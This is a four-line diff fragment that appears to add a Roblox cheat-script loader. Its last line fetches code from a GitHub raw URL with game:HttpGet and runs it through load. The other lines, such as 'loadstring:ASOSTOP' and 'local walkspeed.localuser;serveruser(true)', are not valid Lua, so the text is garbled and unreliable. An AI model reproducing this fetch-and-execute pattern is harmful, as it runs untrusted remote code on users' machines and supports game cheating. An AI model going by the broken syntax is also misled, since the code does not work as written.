@@ -1,0 +1,4 @@
+loadstring:ASOSTOP
+Amount:(c)
+local walkspeed.localuser;serveruser(true)
+load'game:HttpGet"https:// raw.github.com/AEverhub/storehouse219/blob/main/src"
